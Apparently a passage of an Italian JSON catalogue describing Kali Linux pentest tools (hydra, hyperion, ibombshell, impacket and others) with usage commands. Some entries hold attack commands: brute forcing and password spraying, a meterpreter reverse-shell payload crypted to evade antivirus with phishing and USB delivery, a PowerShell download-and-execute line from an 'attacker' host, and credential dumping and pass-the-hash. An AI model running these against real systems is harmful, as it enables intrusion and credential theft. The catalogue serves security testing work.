    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTTPx è un toolkit HTTP multi-purpose sviluppato da ProjectDiscovery. Esegue probe HTTP/HTTPS su larga scala estraendo titoli, status code, tecnologie, content-length, screenshot e molto altro. Estremamente veloce grazie a goroutines concorrenti, è fondamentale nelle pipeline di bug bounty.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-probe:</strong> HTTP/HTTPS, ports custom, path specifici.</p><p><strong>Tech Detection:</strong> Integra Wappalyzer per fingerprinting.</p><p><strong>Screenshot:</strong> Cattura automatica pagine web.</p><p><strong>Output ricco:</strong> JSON, CSV con tutti i metadati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Probe base con titolo e status\ncat subdomains.txt | httpx -title -status-code\n\n# Estrazione completa\nhttpx -l urls.txt -tech-detect -content-length -json\n\n# Con screenshot\nhttpx -l targets.txt -screenshot -screenshot-timeout 10\n\n# Pipeline completa\nsubfinder -d target.com | httpx -silent | nuclei</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty</strong>, filtra e arricchisce liste di subdomain.</p><p>Nel <strong>Recon</strong>, identifica rapidamente tecnologie e versioni.</p><p><strong>Monitoring</strong> per cambiamenti su asset.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Connessioni HTTP dirette. User-agent identificabile (customizzabile). Alto volume di request su target multipli.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httrack",
    "name": "httrack",
    "version": "3.49.6",
    "icon": "../app/icons/httrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httrack/",
    "desc": "Web crawler per download offline di siti completi mantenendo struttura link.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTTrack</strong> è un website copier che scarica interi siti web per visualizzazione offline. Mantiene la struttura originale dei link, converte URL assoluti in relativi, e gestisce JavaScript e CSS. Utile per analisi offline di siti target o preservazione di evidence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mirror completo:</strong> Download ricorsivo di tutte le risorse.</p><p><strong>Link rewriting:</strong> Conversione per navigazione offline.</p><p><strong>Filtri:</strong> Include/escludi per estensione, path, dimensione.</p><p><strong>Resume:</strong> Riprende download interrotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Mirror semplice\nhttrack https://target.com -O ./output\n\n# Con profondità limitata\nhttrack https://target.com -O ./mirror -r3\n\n# Solo HTML e immagini\nhttrack https://target.com +*.html +*.jpg +*.png -r\n\n# GUI\nwebhttrack</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Evidence Collection</strong>, preserva stato del sito prima di modifiche.</p><p><strong>Offline Analysis</strong> di contenuti web.</p><p>Nel <strong>Pentesting</strong>, analisi di struttura e contenuti senza traffico continuo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active:</strong> Alto traffico durante download. User-agent identificabile. Può attivare rate limiting o ban. Rispetta robots.txt di default.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "humble",
    "name": "humble",
    "version": "1.52",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/humble/",
    "desc": "Analizza header HTTP per trovare misconfiguration e security header mancanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Humble</strong> è un analizzatore specializzato di HTTP security header che verifica la presenza e la corretta configurazione degli header di sicurezza delle applicazioni web. Controlla header critici come Content-Security-Policy (CSP), HTTP Strict-Transport-Security (HSTS), X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy e molti altri. Fornisce un rating complessivo della postura di sicurezza e raccomandazioni dettagliate basate su best practice OWASP per correggere le misconfigurazioni identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Header Analysis:</strong> verifica tutti i security header standard e moderni inclusi CSP, HSTS, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy, Cross-Origin headers e cookie security flags.</p><p><strong>Security Scoring System:</strong> calcola un punteggio complessivo della sicurezza degli header basato sulla presenza, configurazione e valore di ogni header, permettendo comparazione tra applicazioni e tracking dei miglioramenti.</p><p><strong>Actionable Recommendations:</strong> fornisce suggerimenti specifici e dettagliati per ogni header mancante o misconfigured, con valori raccomandati e spiegazioni del rischio associato alla mancanza.</p><p><strong>Multiple Export Formats:</strong> genera report in JSON, CSV, HTML e altri formati per integrazione in pipeline CI/CD, dashboard di security e documentazione di assessment.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi base di un sito\nhumble https://target.com\n\n# Output dettagliato con spiegazioni\nhumble -u https://target.com -v\n\n# Analisi di lista URL\nhumble -l urls.txt\n\n# Export in formato JSON\nhumble -u https://target.com -o json\n\n# Export HTML per report\nhumble -u https://target.com -o html &gt; report.html\n\n# Solo header specifici\nhumble -u https://target.com --headers csp,hsts\n\n# Ignora certificati SSL invalidi\nhumble -u https://target.com -k\n\n# Con timeout custom\nhumble -u https://target.com --timeout 30</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Security Assessment</strong>, verificare rapidamente la configurazione dei security header come parte di un penetration test, identificando protezioni mancanti contro clickjacking, XSS, MIME sniffing e altri attacchi.</p><p>Per <strong>Compliance Auditing</strong>, verificare che le applicazioni web rispettino requisiti di security header definiti da policy aziendali, standard di settore (PCI-DSS) o best practice OWASP.</p><p>Per <strong>Bug Bounty Hunting</strong>, identificare misconfigurazioni di security header che possono essere sfruttate o che indicano una postura di sicurezza debole meritevole di ulteriore investigazione.</p><p>Per <strong>CI/CD Security Gates</strong>, integrare in pipeline di deployment per verificare automaticamente che nuove release mantengano security header corretti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive Analysis:</strong> esegue solo richieste HTTP HEAD/GET standard identiche a quelle di un normale browser, generando minimo footprint e traffico non distinguibile dalla normale navigazione. Non invasivo, non richiede autenticazione e non modifica nulla sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "hrepo",
    "name": "hrepo",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hrepo/",
    "desc": "Enumera repository Git esposti pubblicamente su server web per leak di codice sorgente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HRepo</strong> è un tool specializzato per scoprire e analizzare repository Git esposti pubblicamente su server web. Cerca directory .git accessibili via HTTP che non dovrebbero essere pubbliche - un errore di deployment sorprendentemente comune che può esporre l'intero codice sorgente dell'applicazione, cronologia completa dei commit con tutti i file mai esistiti (anche cancellati), credenziali hardcoded, chiavi API, configurazioni sensibili e informazioni sulla struttura interna del progetto. Una singola .git esposta può compromettere completamente la sicurezza di un'applicazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Git Directory Detection:</strong> identifica directory .git accessibili via HTTP testando path caratteristici come .git/HEAD, .git/config e .git/index, distinguendo tra esposizioni complete e parziali.</p><p><strong>Full Repository Reconstruction:</strong> scarica tutti gli oggetti Git (blob, tree, commit) e ricostruisce il repository completo localmente, permettendo checkout del codice sorgente attuale e di tutti i branch.</p><p><strong>History Extraction:</strong> recupera l'intera cronologia dei commit permettendo di accedere a file cancellati, versioni precedenti e modifiche che potrebbero contenere credenziali successivamente rimosse ma ancora presenti nella history.</p><p><strong>Automated Secrets Analysis:</strong> analizza il repository scaricato per pattern di credenziali, API key, password, token e altri secrets comunemente hardcodati nel codice sorgente o nei file di configurazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check singolo target per .git esposta\nhrepo -u https://target.com\n\n# Scan di lista URL\nhrepo -l urls.txt\n\n# Dump completo del repository\nhrepo -u https://target.com --dump\n\n# Con analisi automatica di secrets\nhrepo -u https://target.com --dump --secrets\n\n# Output in formato JSON\nhrepo -u https://target.com -o json\n\n# Dopo il dump, analizza localmente\ncd dumped_repo/\ngit log --all --oneline\ngit show &lt;commit&gt;\ngit diff HEAD~10\n\n# Cerca secrets con truffleHog\ntrufflehog filesystem ./dumped_repo/\n\n# Cerca pattern sensibili\ngrep -r \"password\\|api_key\\|secret\" ./dumped_repo/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Bug Bounty Hunting</strong>, trovare source code disclosure via .git esposta è una vulnerabilità comune e di alto impatto, spesso premiata con bounty significativi per l'accesso al codice sorgente.</p><p>Per <strong>Penetration Testing</strong>, accedere a credenziali, API key e configurazioni presenti nel repository può fornire accesso diretto a database, servizi cloud e sistemi backend.</p><p>Per <strong>OSINT &amp; Code Review</strong>, analizzare il codice sorgente per comprendere la logica applicativa, identificare vulnerabilità nel codice e mappare l'architettura interna del target.</p><p>Per <strong>Historical Analysis</strong>, recuperare file e credenziali cancellati che esistono ancora nella Git history, spesso contenenti secrets che gli sviluppatori credevano rimossi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Scanning:</strong> le richieste HTTP a path .git/* sono riconoscibili e possono essere loggate. Il download completo del repository genera traffico significativo. Alcuni WAF bloccano accesso a .git/. Pattern di accesso sequenziale agli oggetti Git è identificabile come reconnaissance.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "hydra-kali",
    "name": "hydra",
    "version": "9.5",
    "icon": "../app/icons/hydra-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hydra/",
    "desc": "Brute forcer veloce e parallelo per 50+ protocolli: SSH, FTP, HTTP, RDP, SMB, MySQL.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hydra</strong> (THC Hydra) è il password cracker online più completo, veloce e versatile disponibile. Supporta oltre 50 protocolli di rete e applicativi tra cui SSH, FTP, Telnet, HTTP/HTTPS (form, basic, digest), RDP, VNC, SMB, MySQL, MSSQL, PostgreSQL, Oracle, LDAP, IMAP, POP3, SMTP e molti altri. Utilizza attacchi dizionario con threading parallelo massivo per testare migliaia di combinazioni al minuto. È lo strumento di riferimento per password auditing e credential testing durante penetration test.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>50+ Protocol Support:</strong> supporta nativamente la maggior parte dei protocolli di autenticazione di rete e applicativi, con moduli specifici ottimizzati per ogni servizio e gestione automatica delle peculiarità di ogni protocollo.</p><p><strong>Massive Parallelism:</strong> architettura multi-thread che permette centinaia di connessioni parallele configurabili, massimizzando la velocità di testing nel rispetto dei limiti del target e della rete.</p><p><strong>Flexible Input Sources:</strong> accetta username e password singoli, liste da file, generazione combinatoria e supporta formati di input per combo files (user:pass), permettendo strategie di attacco flessibili.</p><p><strong>Session Resume:</strong> salva automaticamente lo stato dell'attacco permettendo di riprendere sessioni interrotte dal punto esatto di interruzione, essenziale per wordlist massive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SSH brute force con wordlist\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com\n\n# HTTP POST form login\nhydra -l admin -P pass.txt target.com http-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=Login failed\"\n\n# RDP con lista utenti e password\nhydra -L users.txt -P passwords.txt rdp://target.com\n\n# SMB/Windows authentication\nhydra -L users.txt -P pass.txt smb://target.com\n\n# FTP con rate limiting\nhydra -l anonymous -P pass.txt -t 4 -W 2 ftp://target.com\n\n# MySQL database\nhydra -l root -P pass.txt mysql://target.com\n\n# HTTP Basic Auth\nhydra -l admin -P pass.txt target.com http-get /admin/\n\n# Con output file e verbose\nhydra -l admin -P pass.txt -o results.txt -V ssh://target.com\n\n# Resume sessione interrotta\nhydra -R\n\n# Password spray (una password, molti utenti)\nhydra -L users.txt -p 'Summer2024!' ssh://target.com -t 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Penetration Testing</strong>, testare password policy e identificare credenziali deboli o di default su servizi esposti, validando la robustezza dei controlli di autenticazione.</p><p>Per <strong>Password Spraying</strong>, testare password comuni (stagione+anno, Company123) contro molti account con rate limiting per evitare lockout, tecnica efficace contro Active Directory.</p><p>Per <strong>CTF Competitions</strong>, cracking rapido di servizi con autenticazione durante challenge di sicurezza dove la velocità è critica.</p><p>Per <strong>Security Compliance Audit</strong>, verificare che non esistano credenziali di default, password deboli o account con password comuni in violazione delle policy aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rumoroso:</strong> genera migliaia di tentativi di login che sono facilmente rilevabili da IDS, SIEM e sistemi di monitoring. Causa lockout degli account se le policy lo prevedono. Usare rate limiting (-t per thread, -W per wait) e considerare password spraying invece di brute force tradizionale. Coordinare con il cliente per evitare disruption durante pentest.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "hyperion",
    "name": "hyperion",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hyperion/",
    "desc": "Runtime encrypter per PE files Windows che bypassa AV con encryption AES.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hyperion</strong> è un runtime crypter per eseguibili Windows PE (Portable Executable) che cripta il payload con AES-128 e genera un wrapper auto-decrittante. Il file risultante contiene il payload cifrato e uno stub che, a runtime, decripta il codice originale in memoria ed esegue il programma. Questa tecnica rende inefficace la detection basata su signature statiche, poiché il pattern del malware originale è nascosto dalla crittografia fino al momento dell'esecuzione. È uno strumento classico per AV evasion, sebbene le moderne soluzioni EDR con analisi comportamentale ne limitino l'efficacia.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES-128 Encryption:</strong> cripta l'intero eseguibile PE originale con AES-128 usando una chiave generata casualmente, nascondendo completamente il contenuto originale incluse tutte le stringhe e signature identificabili.</p><p><strong>Runtime In-Memory Decryption:</strong> lo stub decripta il payload direttamente in memoria a runtime senza mai scrivere il file originale su disco, evitando detection da scansioni filesystem.</p><p><strong>Self-Contained Stub:</strong> genera un eseguibile completamente autonomo che include stub di decrittazione, payload cifrato e chiave, senza dipendenze esterne o necessità di file aggiuntivi.</p><p><strong>PE Format Preservation:</strong> mantiene la struttura PE valida nell'output permettendo esecuzione normale su Windows, con supporto per PE32 e PE32+ (x86 e x64).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cripta un eseguibile con Hyperion (richiede Wine su Linux)\nwine /usr/share/windows-resources/hyperion/hyperion.exe payload.exe crypted.exe\n\n# Verifica che l'output sia un PE valido\nfile crypted.exe\n\n# Workflow tipico per payload Metasploit:\n# 1. Genera payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe\n\n# 2. Cripta con Hyperion\nwine /usr/share/windows-resources/hyperion/hyperion.exe payload.exe crypted.exe\n\n# 3. Verifica detection (opzionale)\n# Upload su VirusTotal o test con AV locale\n\n# 4. Delivery al target\n# Hosting su web server, phishing, USB drop, etc.\n\n# Compilare Hyperion da sorgente (per modifiche)\n# Richiede MinGW cross-compiler\ni686-w64-mingw32-gcc hyperion.c -o hyperion.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team AV Evasion</strong>, bypassare antivirus signature-based durante engagement permettendo delivery di payload custom senza detection iniziale.</p><p>Per <strong>Payload Obfuscation</strong>, nascondere la natura del payload durante il trasferimento e storage, rivelando il contenuto solo al momento dell'esecuzione in memoria.</p><p>Per <strong>AV/EDR Testing</strong>, verificare le capacità di detection delle soluzioni di sicurezza endpoint testandole contro payload criptati e tecniche di evasion note.</p><p>Per <strong>Security Research</strong>, studiare tecniche di runtime encryption e come le soluzioni di sicurezza rispondono a payload offuscati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Limitations:</strong> Hyperion stesso e il suo stub sono noti e flaggati da molti AV moderni. La detection comportamentale e l'analisi euristica degli EDR possono rilevare il payload dopo la decrittazione in memoria. Lo stub genera pattern riconoscibili durante l'esecuzione. Per evasion efficace su target protetti, considerare crypter custom o tecniche più avanzate. Tool principalmente educativo su come funziona il runtime encryption.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ibombshell",
    "name": "ibombshell",
    "version": "0~git20201107",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ibombshell/",
    "desc": "Post-exploitation tool con PowerShell e Python per operazioni su sistemi compromessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>iBombShell</strong> è un framework di post-exploitation modulare che opera tramite PowerShell (Windows) e Python (cross-platform). Fornisce una shell interattiva potenziata per operazioni su sistemi compromessi, con architettura modulare che permette di caricare dinamicamente funzionalità aggiuntive. Può operare in due modalità: \"everywhere\" (completamente fileless, eseguito in memoria) o \"console\" (con server C2 dedicato per controllo centralizzato di multiple sessioni). Sviluppato da ElevenPaths/Telefónica, combina semplicità d'uso con funzionalità avanzate di post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fileless Execution Mode:</strong> la modalità \"everywhere\" esegue interamente in memoria PowerShell senza scrivere file su disco, riducendo gli artefatti forensi e bypassando controlli basati su file system.</p><p><strong>Dynamic Module Loading:</strong> architettura modulare che permette di caricare funzionalità on-demand (credential dumping, privilege escalation, lateral movement) senza includere tutto il codice nel payload iniziale.</p><p><strong>Cross-Platform Support:</strong> client PowerShell per Windows con piena integrazione con l'ecosistema Windows/AD, e client Python per operazioni su Linux e macOS.</p><p><strong>C2 Console Server:</strong> server di comando e controllo Python che gestisce multiple sessioni, permette esecuzione di comandi su tutti gli agent e fornisce logging centralizzato delle operazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia console server C2\npython3 ibombshell.py\n\n# Client PowerShell - everywhere mode (fileless)\n# Esegui sul target Windows:\niex(new-object net.webclient).downloadstring('http://attacker:8080/ibombshell.ps1')\n\n# Comandi disponibili nella shell:\nhelp                    # Lista comandi disponibili\nload-functions          # Carica moduli aggiuntivi\nget-system              # Privilege escalation\ndump-credentials        # Estrai credenziali\nget-info                # System information\nbypass-uac              # UAC bypass\ninvoke-mimikatz        # Integrazione Mimikatz\nget-process             # Lista processi\nget-services            # Lista servizi\n\n# Modalità silentmode\nset-silentmode on\n\n# Lateral movement\ninvoke-psremoting -target 192.168.1.100 -command \"whoami\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Operations</strong>, condurre post-exploitation fileless su sistemi Windows minimizzando gli artefatti forensi e mantenendo persistenza in memoria.</p><p>Per <strong>Penetration Testing</strong>, eseguire operazioni standard di post-exploitation (enumeration, credential harvesting, privilege escalation) con un framework unificato e modulare.</p><p>Per <strong>Lateral Movement</strong>, utilizzare i moduli integrati per spostarsi tra sistemi Windows sfruttando credenziali raccolte, WMI, PSRemoting e altre tecniche.</p><p>Per <strong>Multi-Target Management</strong>, controllare multiple sessioni compromesse da una singola console C2 per operazioni coordinate su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Vectors:</strong> PowerShell Script Block Logging e Module Logging catturano i comandi eseguiti. AMSI (Antimalware Scan Interface) può rilevare payload noti - necessario bypass. Il traffico C2 HTTP è identificabile da proxy e IDS. Le operazioni in memoria sono comunque visibili a EDR avanzati tramite ETW e memory scanning. Considerare obfuscation e AMSI bypass per ambienti protetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "ident-user-enum",
    "name": "ident-user-enum",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ident-user-enum/",
    "desc": "Enumera username su sistemi che espongono ident service (porta 113) via TCP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ident-user-enum</strong> è un tool per enumerare username su sistemi che espongono il servizio Ident (RFC 1413) sulla porta TCP 113. Il protocollo Ident, originariamente progettato per identificare l'utente proprietario di una connessione TCP, risponde con lo username del processo che ha stabilito una specifica connessione. Sebbene largamente deprecato per ragioni di sicurezza, il servizio è ancora presente su alcuni sistemi Unix/Linux legacy, server IRC e ambienti non aggiornati. Quando disponibile, fornisce username validi utili per attacchi di brute force successivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Username Discovery via Ident:</strong> interroga il servizio Ident per ottenere lo username associato a connessioni TCP attive su porte specifiche, rivelando account utente validi sul sistema target.</p><p><strong>Port-to-User Correlation:</strong> associa username agli specifici servizi/porte su cui sono attive connessioni, fornendo insight su quali utenti gestiscono quali servizi (es. www-data per porta 80, mysql per 3306).</p><p><strong>Multi-Port Batch Testing:</strong> testa simultaneamente multiple porte su uno o più host per massimizzare l'enumerazione degli username in ambienti con servizi diversi.</p><p><strong>Structured Output:</strong> genera lista pulita di username trovati facilmente utilizzabile come input per tool di brute force come Hydra o Medusa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera utente sulla porta SSH (22)\nident-user-enum target.com 22\n\n# Test su multiple porte comuni\nident-user-enum target.com 22,25,80,110,143,443\n\n# Scan di lista host\ncat hosts.txt | while read h; do ident-user-enum $h 22; done\n\n# Prima verifica se Ident è attivo\nnmap -p 113 target.com\n\n# Workflow completo:\n# 1. Identifica host con porta 113 aperta\nnmap -p 113 --open 192.168.1.0/24 -oG - | grep \"113/open\"\n\n# 2. Enumera username su host con Ident\nfor ip in $(cat ident_hosts.txt); do\n  echo \"=== $ip ===\"\n  ident-user-enum $ip 22,80,443\ndone\n\n# 3. Usa username trovati per brute force\nhydra -L found_users.txt -P passwords.txt ssh://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Username Enumeration</strong>, scoprire account utente validi sul sistema target da utilizzare in attacchi di brute force, password spraying o social engineering.</p><p>Per <strong>Legacy System Assessment</strong>, durante audit di sicurezza su infrastrutture datate dove Ident potrebbe essere ancora attivo e non configurato correttamente.</p><p>Per <strong>Service-User Mapping</strong>, identificare quali utenti eseguono quali servizi per comprendere la configurazione del sistema e identificare potenziali vettori di escalation.</p><p>Per <strong>IRC Server Testing</strong>, i server IRC spesso richiedono e utilizzano Ident - utile per testing di infrastrutture IRC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Low Footprint:</strong> le query Ident sono richieste TCP standard alla porta 113, generano traffico minimo e sono raramente monitorate o loggate. Tuttavia, il servizio è raro su sistemi moderni - la porta 113 chiusa o filtrata è la norma. Utile principalmente in contesti legacy, ambienti Unix datati o server IRC. Quando funziona, fornisce informazioni gratuite senza detection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Porta_113"
    ],
    "notes": null
  },
  {
    "id": "ike-scan",
    "name": "ike-scan",
    "version": "1.9.5",
    "icon": "../app/icons/ike-scan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ike-scan/",
    "desc": "Scopre e fingerprint gateway VPN IPsec analizzando risposte IKE e transform set.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>IKE-scan</strong> è lo strumento di riferimento per discovery e fingerprinting di gateway VPN IPsec. Invia pacchetti IKE (Internet Key Exchange) Phase 1 sulla porta UDP 500 e analizza le risposte per identificare vendor, versione del software VPN e transform set supportati (algoritmi di cifratura, hash, gruppi Diffie-Hellman). È essenziale per assessment di sicurezza di infrastrutture VPN, identificazione di configurazioni deboli o deprecate, e mappatura del perimetro di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VPN Gateway Discovery:</strong> identifica gateway IKE attivi su singoli host o range di IP, determinando quali sistemi offrono servizi VPN IPsec e rispondono a negoziazioni IKE.</p><p><strong>Vendor Fingerprinting:</strong> analizza le risposte IKE per identificare il vendor (Cisco, Checkpoint, Juniper, Fortinet, etc.) e spesso la versione specifica del software VPN tramite pattern nelle risposte e Vendor ID payload.</p><p><strong>Transform Set Enumeration:</strong> enumera i cipher suite supportati testando combinazioni di encryption (3DES, AES), hash (MD5, SHA), authentication (PSK, RSA) e gruppi DH per identificare configurazioni deboli.</p><p><strong>Aggressive Mode Testing:</strong> testa se il gateway supporta Aggressive Mode che può rivelare informazioni sensibili come group names, permettendo attacchi di tipo PSK cracking offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base di un gateway VPN\nike-scan target.com\n\n# Aggressive mode (rivela più informazioni, incluso group name)\nike-scan -A target.com\n\n# Con transform set specifico (enc, hash, auth, group)\nike-scan --trans=5,2,1,2 target.com\n\n# Scan di un range per discovery VPN\nike-scan 192.168.1.0/24\n\n# Mostra vendor ID decodificati\nike-scan -v target.com\n\n# Specificando source port\nike-scan -sport=500 target.com\n\n# Con ID specifico per aggressive mode\nike-scan -A --id=vpngroup target.com\n\n# Output dettagliato per fingerprinting\nike-scan -v -v target.com\n\n# Workflow per PSK cracking:\n# 1. Test aggressive mode\nike-scan -A -v target.com\n# 2. Se risponde, cattura handshake\nike-scan -A --id=groupname -P target.com\n# 3. Crack PSK con psk-crack o hashcat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VPN Security Assessment</strong>, valutare la configurazione di sicurezza dei gateway VPN identificando cipher deboli (DES, MD5), Aggressive Mode esposto e versioni software vulnerabili.</p><p>Per <strong>Perimeter Reconnaissance</strong>, mappare tutti i gateway VPN esposti sul perimetro di un'organizzazione durante la fase di reconnaissance di un penetration test.</p><p>Per <strong>PSK Attack Preparation</strong>, identificare VPN che supportano Aggressive Mode per catturare handshake e tentare cracking offline delle Pre-Shared Key.</p><p>Per <strong>Compliance Verification</strong>, verificare che le configurazioni VPN rispettino policy di sicurezza (no cipher deprecati, no Aggressive Mode, etc.).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Scanning:</strong> genera pacchetti IKE verso porta UDP 500 che sono facilmente loggati da firewall e IDS. Aggressive Mode rivela informazioni anche sul client (source). Il pattern di scansione è riconoscibile. Range scan genera molto traffico. Usare con cautela e autorizzazione durante penetration test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "impacket-scripts",
    "name": "impacket-scripts",
    "version": "1.1",
    "icon": "../app/icons/impacket-scripts-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/impacket-scripts/",
    "desc": "Wrapper e script aggiuntivi per semplificare l'uso degli script Impacket.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Impacket-scripts</strong> è un pacchetto che fornisce wrapper e script di convenienza per semplificare l'utilizzo della potente libreria Impacket. Include interfacce command-line pronte all'uso per tutte le operazioni comuni: autenticazione Windows, esecuzione remota, dump di credenziali, attacchi Kerberos e manipolazione di protocolli Windows. Permette di eseguire operazioni complesse senza dover scrivere codice Python custom, rendendo Impacket accessibile direttamente dalla shell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ready-to-Use Wrappers:</strong> interfacce command-line che wrappano gli script Python di Impacket con parsing degli argomenti, help integrato e gestione degli errori, utilizzabili direttamente come comandi di sistema.</p><p><strong>Common Operation Scripts:</strong> script preconfigurati per operazioni frequenti durante penetration test: remote execution (psexec, wmiexec, smbexec), credential dumping (secretsdump), Kerberos attacks (GetUserSPNs, GetNPUsers), e altro.</p><p><strong>Pipeline Integration:</strong> output strutturato e exit code appropriati che facilitano l'integrazione in script bash, pipeline di automazione e workflow di penetration testing.</p><p><strong>Consistent Interface:</strong> sintassi uniforme per tutti gli script (domain/user:password@target o -hashes per pass-the-hash) che semplifica l'apprendimento e l'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Remote shell via PSExec (crea servizio temporaneo)\nimpacket-psexec domain/admin:Password123@192.168.1.100\n\n# Remote shell via WMI (più stealth, no servizio)\nimpacket-wmiexec domain/admin:Password123@192.168.1.100\n\n# Con hash NTLM invece di password (pass-the-hash)\nimpacket-psexec -hashes aad3b435b51404ee:8846f7eaee8fb117 domain/admin@target\n\n# Dump credenziali da DC (SAM, LSA, NTDS)\nimpacket-secretsdump domain/admin:Password123@dc01.domain.local\n\n# Kerberoasting - estrai hash SPN\nimpacket-GetUserSPNs domain/user:password -dc-ip 10.10.10.1 -request\n\n# AS-REP Roasting - utenti senza preauth\nimpacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.1\n\n# Esegui comando singolo via 